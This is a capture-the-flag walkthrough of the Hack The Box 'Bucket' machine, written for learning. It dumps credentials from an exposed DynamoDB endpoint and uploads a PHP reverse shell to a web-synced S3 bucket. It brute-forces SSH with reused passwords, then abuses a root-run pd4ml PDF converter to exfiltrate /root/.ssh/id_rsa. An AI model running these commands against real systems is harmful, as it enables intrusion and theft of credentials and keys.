![](bucket_banner.png)

<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="http://www.hackthebox.eu/badge/image/391067"></img></a>
</p>

# Scanning

## Nmap

`ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.10.193 | grep open | awk -F / '{print $1}' ORS=',') echo $ports && nmap -p$ports -sV -sC -v -T4 -oA scans/nmap.full 10.10.10.193`
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://bucket.htb/
```

## Web_server

- `10.10.10.212` redirected to `bucket.htb` ,
- add `bucket.htb` in the `/etc/hosts` file .
- crawling through `bucket.htb` i found some links in the source-code that indicates potential subdomain .

	  <img src="http://s3.bucket.htb/adserver/images/bug.jpg" alt="Bug" height="160" width="160">
	  <img src="http://s3.bucket.htb/adserver/images/malware.png" alt="Malware" height="160" width="160">
	  <img src="http://s3.bucket.htb/adserver/images/cloud.png" alt="cheer" height="160" width="160">

- add `s3.bucket.htb` in the `/etc/hosts` file

## gobuster
>s3.bucket.htb

`gobuster dir -u http://s3.bucket.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50`
```
/health (Status: 200)
/shell (Status: 200)
```
### /health

- __goto__ `s3.bucket.htb/health/` shows

	{"status": "running"}

- __goto__ `s3.bucket.htb/health` shows

	{"services": {"s3": "running", "dynamodb": "running"}}

- so 2 services running, whom i know nothing about ,

__ask google__

__s3 :__ Amazon S3 or Amazon Simple Storage Service is a service offered by Amazon Web Services that provides object storage through a web service interface. 

- so s3 is a amazon aws service which store data inside digital buckets .

__dynamodb :__ Amazon DynamoDB is a fully managed proprietary NoSQL database service that supports key-value and document data structures and is offered by Amazon.com as part of the Amazon Web Services portfolio.

- so dynamodb is a database service that manage bucket data .
- these services running on `hypercorn-h11` server , [DOC](https://pypi.org/project/Hypercorn/) .
- google also indicates that the dynamodb is a `NoSQL` type database .

### /shell

- `s3.bucket.htb/shell/` revealed a intrective `DynamoDB JavaScript Shell` .
- using this shell we can talk to the backend database service and dump data from the server .
- heading to the `API Templates` tab i found some prebuild templates .
- i read [API Docs](https://docs.aws.amazon.com/AmazonS3/latest/API/Welcome.html) and build my own [simple templates](awsApiTmpl) .
- reading through google i found a `awscli` tool similar as webshell but can run from the terminal, [tool](https://github.com/aws/aws-cli)

## awscli

### Configure awscli

- before running `awscli` we need to configure it but when i configuring it asking for `access_key` and `secret_key` and i don't have these or don't know about
- some __googling__ i found a [document](https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/DynamoDBLocal.DownloadingAndRunning.html)
- doc tells `any credentials to work`

	`aws configure`

	  access_key:ANYTHINGTOCONFIGUREE
	  secret_key:zxcvbnmasDFGH/QWERTYU/pOiUytZSXDCFVGBNJM
	  region:us-west-1
	  output:json

### Dump Data

- __First__, find the table name, [template](awsApiTmpl/list-table.js) for webshell

	`aws dynamodb list-tables --endpoint-url http://s3.bucket.htb/ | jq -r .`

	  {
    	  "TableNames": [
    	  "users"
    	  ]
	  }

- __Second__, scan `users` table, [template](awsApiTmpl/scan-tmpl.js) for webshell

	`aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb/ | jq -r .`

		{
		    "Count": 3,
		    "Items": [
			{
			    "username": {
			    "S": "Mgmt"
			    },
				"password": {
				"S": "Management@#1@#"
			    }
			},
			{
				"username": {
				"S": "Cloudadm"
				},
				"password": {
				"S": "Welcome123!"
			    }
			},
			{
				"username": {
				"S": "Sysadm"
			    },
				"password": {
				"S": "n2vM-<_K_Q:.Aa2"
				}
			}
		    ],
		    "ScannedCount": 3,
		    "ConsumedCapacity": null
                }

#### creds
```bash
Mgmt:Management@#1@#
Cloudadm:Welcome123!
Sysadm:n2vM-<_K_Q:.Aa2
```

### Enumerating through awscli

- investing some time in awscli tool i found that i can list all buckets

	`aws --endpoint-url=http://s3.bucket.htb s3api list-buckets | jq .`
		
		{
		    "Owner": {
		    	"DisplayName": "webfile",
		    	"ID": "bcaf1ffd86f41161ca5fb16fd081034f"
		    },
		    "Buckets": [
		    	{
		        "CreationDate": "2020-11-04T03:32:03.881865Z",
		        "Name": "adserver"
		    	}
		    ]
		}

	- threre is only one bucket

			"Name": "adserver"

- view inside adserver bucket

	`aws --endpoint-url=http://s3.bucket.htb s3api list-objects --bucket adserver | jq .`

		{
		    "Contents": [
		    	{
			        "LastModified": "2020-11-04T03:42:13.000Z",
			        "ETag": "\"25118cbb11c412f4b517249e6e877dc3\"",
			        "StorageClass": "STANDARD",
			        "Key": "images/bug.jpg",
			        "Owner": {
			        	"DisplayName": "webfile",
			        	"ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
			        },
		        	"Size": 37840
		    	},
			    {
			        "LastModified": "2020-11-04T03:42:13.000Z",
			        "ETag": "\"4d7905acad5d78b01085e461f78eae43\"",
			        "StorageClass": "STANDARD",
			        "Key": "images/cloud.png",
			        "Owner": {
			        	"DisplayName": "webfile",
			        	"ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
			        },
			        "Size": 51485
			    },
			    {
			        "LastModified": "2020-11-04T03:42:13.000Z",
			        "ETag": "\"b22715647e087104f6b1ff7c0ce0731c\"",
			        "StorageClass": "STANDARD",
			        "Key": "images/malware.png",
			        "Owner": {
			        	"DisplayName": "webfile",
			        	"ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
			        },
			        "Size": 16486
			    },
		    	{
			        "LastModified": "2020-11-04T03:42:13.000Z",
			        "ETag": "\"dadef349eabdda42a5ff5118a5b9c229\"",
			        "StorageClass": "STANDARD",
			        "Key": "index.html",
			        "Owner": {
			        	"DisplayName": "webfile",
			        	"ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
			        },
			        "Size": 5344
		    	}
		    ]
		}

	- these files looks like `bucket.htb` source files
	- these file sync in every min or less to the main server

- I try to upload file in the bucket and check if it is accessable from `bucket.htb`

	`aws --endpoint-url=http://s3.bucket.htb s3 cp test.html s3://adserver`

	  upload: ./test.html to s3://adserver/test.html

	`aws --endpoint-url=http://s3.bucket.htb s3 ls s3://adserver`

	  .                          PRE images/
	  2020-11-04 04:16:12       5344 index.html
	  2020-11-04 04:17:01         47 test.html

	`curl -I http://bucket.htb/test.html`

	  HTTP/1.1 200 OK
	  Date: Wed, 04 Nov 2020 04:17:18 GMT
	  Server: Apache/2.4.41 (Ubuntu)
	  Last-Modified: Wed, 04 Nov 2020 04:17:04 GMT
	  ETag: "2f-5b3404073f723"
	  Accept-Ranges: bytes
	  Content-Length: 47
	  Content-Type: text/html

- some notable things,
	- uploaded file sync only once and the automatically deleted after it
	- file takes atleast 30-60sec to sync
	- I can upload php shell and access from the main server


# user Exploit

- __First__, upload php shell in the bucket 

	`aws --endpoint-url=http://s3.bucket.htb s3 cp shell.php s3://adserver`

- __Second__, open netcat listener

	`nc -nvlp 4141`

- __Third__, after sometime i go to `bucket.htb/shell.php` and shell pops in the netcat
- got `www-data` shell

## Enumerating www-data

`cat /etc/passwd`
```
#roy:x:1000:1000:,,,:/home/roy:/bin/bash
```

- don't find any thing in the `www-data`
- only get the user `roy`
- I check if user `roy` can has ssh enable

	`ssh roy@10.10.10.212`

	  roy@10.10.10.212's password:   

- so roy has ssh enable
- i am thinking about bruteforcing ssh but first try to use creds that dumped from the database

	`hydra -l roy -P wordlist 10.10.10.212 -t 4 ssh`

	  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-04 10:19:34
	  [DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task
	  [DATA] attacking ssh://10.10.10.212:22/
	  [22][ssh] host: 10.10.10.212   login: roy   password: n2vM-<_K_Q:.Aa2
	  1 of 1 target successfully completed, 1 valid password found
	  Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-04 10:19:42

- found reused password `n2vM-<_K_Q:.Aa2`

### creds
`roy:n2vM-<_K_Q:.Aa2`

## ssh roy

`ssh roy@10.10.10.212`
```bash
roy@10.10.10.212's password: n2vM-<_K_Q:.Aa2
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)
roy@bucket:~$ cat user.txt
dd3f563b************************
```

## Enumerate user roy

- check network

	`roy@bucket:~$ ss -lnpt`

	  State     Recv-Q    Send-Q         Local Address:Port          Peer Address:Port               
	  LISTEN    0         511                127.0.0.1:8000               0.0.0.0:*

- there is a local server running on port 8000
- inside `/var/www` directory there are two directroies

	  drwxr-x---+  4 root root 4096 Sep 23 10:56 bucket-app
	  drwxr-xr-x   2 root root 4096 Nov  4 08:20 html

- __goto__ local server directory `/var/www/bucket-app/` found `index.php`

	  roy@bucket:/var/www/bucket-app$ ls -la | grep index.php
	  `-rwxr-x---+  1 root root  17222 Sep 23 03:32 index.php`

- `index.php` contians php code snippet.
```php
<?php
require 'vendor/autoload.php';
use Aws\DynamoDb\DynamoDbClient;
if($_SERVER["REQUEST_METHOD"]==="POST") {
        if($_POST["action"]==="get_alerts") {
                date_default_timezone_set('America/New_York');
                $client = new DynamoDbClient([
                        'profile' => 'default',
                        'region'  => 'us-east-1',
                        'version' => 'latest',
                        'endpoint' => 'http://localhost:4566'
                ]);

                $iterator = $client->getIterator('Scan', array(
                        'TableName' => 'alerts',
                        'FilterExpression' => "title = :title",
                        'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
                ));

                foreach ($iterator as $item) {
                        $name=rand(1,10000).'.html';
                        file_put_contents('files/'.$name,$item["data"]);
                }
                passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
        }
}
else
{
?>
```

### script breakdown

- __line 04__, First if statement

	  if($_SERVER["REQUEST_METHOD"]==="POST")

	- this define that the script excecute if user send a `POST` request .

- __line 05__, Second if statement

	  if($_POST["action"]==="get_alerts")

	- this line defines that if server  gets a post request its action must be a `get_alerts`

- so i need to send a `POST` request with `action=get_alerts`

- __line 07-12__, client veriable

	  $client = new DynamoDbClient([
	                          'profile' => 'default',
	                          'region'  => 'us-east-1',
	                          'version' => 'latest',
	                          'endpoint' => 'http://localhost:4566'
		                  ]);

	- this code configure aws client connection

- __line 14-18__, iteration veriable

	  $iterator = $client->getIterator('Scan', array(
	                          'TableName' => 'alerts',
	                          'FilterExpression' => "title = :title",
	                          'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
	                  ));

	- this code iterate data from the database

- but there there is only one table i already saw that
- I think i need to create a table table before trigger that script
- so i need to create a `alerts` table which contains item `Ransomwar`

- __line 20-23__, foreach loop through the `$iterator` veriable

	  foreach ($iterator as $item) {
	                          $name=rand(1,10000).'.html';
	                          file_put_contents('files/'.$name,$item["data"]);
	                  }

	- this code loop data that iterate from that table and set on `$item` veriable
	- the `$item` data go inside the php function `file_put_contents` , [php documentation](https://www.php.net/manual/en/function.file-put-contents.php)
	- this function write `$item` variable data inside `files` directory as the name that `$name` variable defines `example-name: 4141.html`

	  	  roy@bucket:/var/www/bucket-app$ ls -la | grep files
		  drwxr-x---+  2 root root   4096 Sep 23 03:29 files

- __line 24__, passthru function, [php documentation](https://www.php.net/manual/en/function.passthru.php)

	  passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");

	- after `example-name: 4141.html` file generated, this file go through that php function `passthru`
	- this function copy `pd4ml_demo.jar` library form `bucket-app` directory

		  roy@bucket:/var/www/bucket-app$ ls -la | grep pd4ml
		  `-rwxr-x---+  1 root root 808729 Jun 10 11:50 pd4ml_demo.jar`

	- and then execute `pd4cmd` from `pd4ml` library
	- __PD4ML__ is a Java library, which makes possible to create PDF documents from Java and JSP applications using HTML as template language
	- here is the __pd4cmd__ [documentation](https://pd4ml.com/html-to-pdf-command-line-tool.htm) from pd4ml tool
	- so what is happening here is that the `pd4cmd` convert html file into a pdf file and store in the `files/` direcotry as `result.pdf`

### Exploit Surface

- reading through the pd4ml documentation i found a `PDF Attachments` feature . [PDF Attachments doc](https://pd4ml.com/cookbook/pdf-attachments.htm)
- i can use this feature to import `root.txt` as well as `id_rsa` in `result.txt` because this library run as root
- for this to work i need to set `pd4ml:attachment` function inside the html file
- i can do that by setting `pd4ml:attachment` function as data in the table `alerts` inside item `Ransomware` 

# Root Privesc

__First__, create `alerts` table , [template](awsApiTmpl/createTable-tmpl.js) for webshell
```bash
aws dynamodb create-table \
    --table-name alerts \
    --attribute-definitions \
        AttributeName=title,AttributeType=S \
    --key-schema \
        AttributeName=title,KeyType=HASH \
--provisioned-throughput \
        ReadCapacityUnits=10,WriteCapacityUnits=5 \
        --endpoint-url=http://s3.bucket.htb
```

__Second__, put `Ransomware` item , [template](awsApiTmpl/putItem-tmpl.js) for webshell
```bash
aws dynamodb put-item \
--table-name alerts  \
--item \
    '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/.ssh/id_rsa</pd4ml:attachment>"}}' \
    --endpoint-url=http://s3.bucket.htb
```

*specify `pd4ml:attachment` function as item `Ransomware` data so when pd4cmd convert html file into pdf it also attech that file i specified*

__Third__, create tunnel on port 8000 with ssh
```bash
ssh -L 8000:127.0.0.1:8000 roy@bucket.htb
```

__Fourth__, send a post request to `127.0.0.1:8000`

`curl -X POST -d "action=get_alerts" http://127.0.0.1:8000/ -v`

*as soon as request send successfully `result.pdf` file created*

__Note__, `result.pdf` file deletes immediately after created in less then `~10sec` and created table

*to tackle this problem i use sshpass with scp and copy `result.pdf` file in my local machine as soon as it created*

`sshpass -p "n2vM-<_K_Q:.Aa2" scp roy@10.10.10.212:/var/www/bucket-app/files/result.pdf result.pdf`